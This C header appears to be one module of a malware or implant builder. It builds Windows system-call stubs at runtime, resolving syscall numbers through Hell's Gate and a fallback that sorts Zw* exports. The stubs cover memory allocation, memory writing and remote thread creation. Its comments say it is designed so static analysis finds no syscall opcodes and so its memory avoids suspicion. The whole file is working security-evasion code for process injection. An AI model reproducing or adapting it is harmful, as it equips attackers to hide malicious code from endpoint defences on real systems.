// chunk: evasion/manual_syscall_stub
// depends: (none)
// provides: init_indirect_syscalls, indirect_NtAllocateVirtualMemory, indirect_NtWriteVirtualMemory, indirect_NtCreateThreadEx, indirect_NtQuerySystemInformation
// headers: windows.h
// risk: medium
// note: Hand-crafted dynamic syscall stubs — allocates executable memory, writes raw machine code bytes for mov r10,rcx; mov eax,SSN; syscall; ret into it, patches SSNs at runtime, and calls through function pointers. No static syscall instructions in the binary, no ntdll gadgets used, no naked functions. SSNs resolved via sorted Zw* exports. The stubs are built entirely at runtime so static analysis sees no syscall opcodes.

#ifndef CHUNK_MANUAL_SYSCALL_STUB
#define CHUNK_MANUAL_SYSCALL_STUB

// Function pointer types matching NT API signatures
typedef NTSTATUS (NTAPI *pfn_NtAllocateVirtualMemory)(
    HANDLE ProcessHandle, PVOID *BaseAddress, ULONG_PTR ZeroBits,
    PSIZE_T RegionSize, ULONG AllocationType, ULONG Protect);
typedef NTSTATUS (NTAPI *pfn_NtWriteVirtualMemory)(
    HANDLE ProcessHandle, PVOID BaseAddress, PVOID Buffer,
    SIZE_T NumberOfBytesToWrite, PSIZE_T NumberOfBytesWritten);
typedef NTSTATUS (NTAPI *pfn_NtCreateThreadEx)(
    PHANDLE ThreadHandle, ACCESS_MASK DesiredAccess, PVOID ObjectAttributes,
    HANDLE ProcessHandle, PVOID StartRoutine, PVOID Argument,
    ULONG CreateFlags, SIZE_T ZeroBits, SIZE_T StackSize,
    SIZE_T MaximumStackSize, PVOID AttributeList);
typedef NTSTATUS (NTAPI *pfn_NtQuerySystemInformation)(
    ULONG SystemInformationClass, PVOID SystemInformation,
    ULONG SystemInformationLength, PULONG ReturnLength);

static pfn_NtAllocateVirtualMemory  pStub_NtAllocateVirtualMemory  = NULL;
static pfn_NtWriteVirtualMemory     pStub_NtWriteVirtualMemory     = NULL;
static pfn_NtCreateThreadEx         pStub_NtCreateThreadEx         = NULL;
static pfn_NtQuerySystemInformation pStub_NtQuerySystemInformation = NULL;

// Keep these for interface compatibility with other chunks
static DWORD ssn_NtAllocateVirtualMemory = 0;
static DWORD ssn_NtWriteVirtualMemory = 0;
static DWORD ssn_NtCreateThreadEx = 0;
static DWORD ssn_NtQuerySystemInformation = 0;
static void *syscall_ret_gadget = NULL;

// Executable memory region for all stubs
static BYTE *ms_stub_region = NULL;

// --- SSN resolution via sorted Zw* exports ---

typedef struct {
    DWORD rva;
    DWORD name_rva;
} ms_zw_entry_t;

static DWORD ms_resolve_ssn(HMODULE ntdll, const char *func_name) {
    BYTE *base = (BYTE *)ntdll;
    IMAGE_DOS_HEADER *dos = (IMAGE_DOS_HEADER *)base;
    IMAGE_NT_HEADERS *nt = (IMAGE_NT_HEADERS *)(base + dos->e_lfanew);
    DWORD exp_rva = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
    if (!exp_rva) return (DWORD)-1;

    IMAGE_EXPORT_DIRECTORY *exp = (IMAGE_EXPORT_DIRECTORY *)(base + exp_rva);
    DWORD *names = (DWORD *)(base + exp->AddressOfNames);
    WORD *ords = (WORD *)(base + exp->AddressOfNameOrdinals);
    DWORD *funcs = (DWORD *)(base + exp->AddressOfFunctions);

    // First try direct extraction (Hell's Gate)
    for (DWORD i = 0; i < exp->NumberOfNames; i++) {
        char *name = (char *)(base + names[i]);
        if (strcmp(name, func_name) == 0) {
            BYTE *code = base + funcs[ords[i]];
            if (code[0] == 0x4C && code[1] == 0x8B && code[2] == 0xD1 && code[3] == 0xB8)
                return *(DWORD *)(code + 4);
            break;
        }
    }

    // Fallback: sort Zw* exports by RVA (position = SSN)
    ms_zw_entry_t entries[512];
    DWORD count = 0;

    for (DWORD i = 0; i < exp->NumberOfNames && count < 512; i++) {
        char *name = (char *)(base + names[i]);
        if (name[0] == 'Z' && name[1] == 'w') {
            entries[count].rva = funcs[ords[i]];
            entries[count].name_rva = names[i];
            count++;
        }
    }

    if (count == 0) return (DWORD)-1;

    // Insertion sort by RVA
    for (DWORD i = 1; i < count; i++) {
        ms_zw_entry_t key = entries[i];
        int j = (int)i - 1;
        while (j >= 0 && entries[j].rva > key.rva) {
            entries[j + 1] = entries[j];
            j--;
        }
        entries[j + 1] = key;
    }

    // Build Zw equivalent name: NtXxx -> ZwXxx
    char zw_name[128];
    zw_name[0] = 'Z';
    zw_name[1] = 'w';
    int k = 2;
    for (const char *p = func_name + 2; *p && k < 126; p++)
        zw_name[k++] = *p;
    zw_name[k] = '\0';

    for (DWORD i = 0; i < count; i++) {
        char *n = (char *)(base + entries[i].name_rva);
        if (strcmp(n, zw_name) == 0)
            return i;
    }

    return (DWORD)-1;
}

// --- Build a single syscall stub in memory ---
// Writes these bytes into the buffer:
//   49 89 CA           mov r10, rcx       (3 bytes)
//   B8 XX XX 00 00     mov eax, SSN       (5 bytes)
//   0F 05              syscall            (2 bytes)
//   C3                 ret                (1 byte)
// Total: 11 bytes per stub

#define MS_STUB_SIZE 16  // 11 bytes + 5 padding for alignment

static void *ms_build_stub(BYTE *buf, DWORD ssn) {
    // mov r10, rcx (49 89 CA)
    buf[0] = 0x49;
    buf[1] = 0x89;
    buf[2] = 0xCA;
    // mov eax, SSN (B8 XX XX 00 00)
    buf[3] = 0xB8;
    buf[4] = (BYTE)(ssn & 0xFF);
    buf[5] = (BYTE)((ssn >> 8) & 0xFF);
    buf[6] = 0x00;
    buf[7] = 0x00;
    // syscall (0F 05)
    buf[8] = 0x0F;
    buf[9] = 0x05;
    // ret (C3)
    buf[10] = 0xC3;

    return (void *)buf;
}

static int init_indirect_syscalls(void) {
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    if (!ntdll) return 0;

    // Resolve all SSNs
    ssn_NtAllocateVirtualMemory  = ms_resolve_ssn(ntdll, "NtAllocateVirtualMemory");
    ssn_NtWriteVirtualMemory     = ms_resolve_ssn(ntdll, "NtWriteVirtualMemory");
    ssn_NtCreateThreadEx         = ms_resolve_ssn(ntdll, "NtCreateThreadEx");
    ssn_NtQuerySystemInformation = ms_resolve_ssn(ntdll, "NtQuerySystemInformation");

    if (ssn_NtAllocateVirtualMemory == (DWORD)-1 ||
        ssn_NtWriteVirtualMemory == (DWORD)-1 ||
        ssn_NtCreateThreadEx == (DWORD)-1 ||
        ssn_NtQuerySystemInformation == (DWORD)-1)
        return 0;

    // Allocate executable memory for 4 stubs
    ms_stub_region = (BYTE *)VirtualAlloc(NULL, MS_STUB_SIZE * 4,
                                           MEM_COMMIT | MEM_RESERVE,
                                           PAGE_READWRITE);
    if (!ms_stub_region) return 0;

    // Build each stub
    pStub_NtAllocateVirtualMemory  = (pfn_NtAllocateVirtualMemory)
        ms_build_stub(ms_stub_region + MS_STUB_SIZE * 0, ssn_NtAllocateVirtualMemory);
    pStub_NtWriteVirtualMemory     = (pfn_NtWriteVirtualMemory)
        ms_build_stub(ms_stub_region + MS_STUB_SIZE * 1, ssn_NtWriteVirtualMemory);
    pStub_NtCreateThreadEx         = (pfn_NtCreateThreadEx)
        ms_build_stub(ms_stub_region + MS_STUB_SIZE * 2, ssn_NtCreateThreadEx);
    pStub_NtQuerySystemInformation = (pfn_NtQuerySystemInformation)
        ms_build_stub(ms_stub_region + MS_STUB_SIZE * 3, ssn_NtQuerySystemInformation);

    // Change protection to RX (remove write to avoid suspicion)
    DWORD old_protect;
    VirtualProtect(ms_stub_region, MS_STUB_SIZE * 4, PAGE_EXECUTE_READ, &old_protect);

    // Set for interface compatibility
    syscall_ret_gadget = (void *)ms_stub_region;

    return 1;
}

// Wrapper functions that forward to the dynamically built stubs
static NTSTATUS indirect_NtAllocateVirtualMemory(
    HANDLE ProcessHandle, PVOID *BaseAddress, ULONG_PTR ZeroBits,
    PSIZE_T RegionSize, ULONG AllocationType, ULONG Protect) {
    return pStub_NtAllocateVirtualMemory(ProcessHandle, BaseAddress, ZeroBits,
                                          RegionSize, AllocationType, Protect);
}

static NTSTATUS indirect_NtWriteVirtualMemory(
    HANDLE ProcessHandle, PVOID BaseAddress, PVOID Buffer,
    SIZE_T NumberOfBytesToWrite, PSIZE_T NumberOfBytesWritten) {
    return pStub_NtWriteVirtualMemory(ProcessHandle, BaseAddress, Buffer,
                                       NumberOfBytesToWrite, NumberOfBytesWritten);
}

static NTSTATUS indirect_NtCreateThreadEx(
    PHANDLE ThreadHandle, ACCESS_MASK DesiredAccess, PVOID ObjectAttributes,
    HANDLE ProcessHandle, PVOID StartRoutine, PVOID Argument,
    ULONG CreateFlags, SIZE_T ZeroBits, SIZE_T StackSize,
    SIZE_T MaximumStackSize, PVOID AttributeList) {
    return pStub_NtCreateThreadEx(ThreadHandle, DesiredAccess, ObjectAttributes,
                                   ProcessHandle, StartRoutine, Argument,
                                   CreateFlags, ZeroBits, StackSize,
                                   MaximumStackSize, AttributeList);
}

static NTSTATUS indirect_NtQuerySystemInformation(
    ULONG SystemInformationClass, PVOID SystemInformation,
    ULONG SystemInformationLength, PULONG ReturnLength) {
    return pStub_NtQuerySystemInformation(SystemInformationClass, SystemInformation,
                                           SystemInformationLength, ReturnLength);
}

#endif
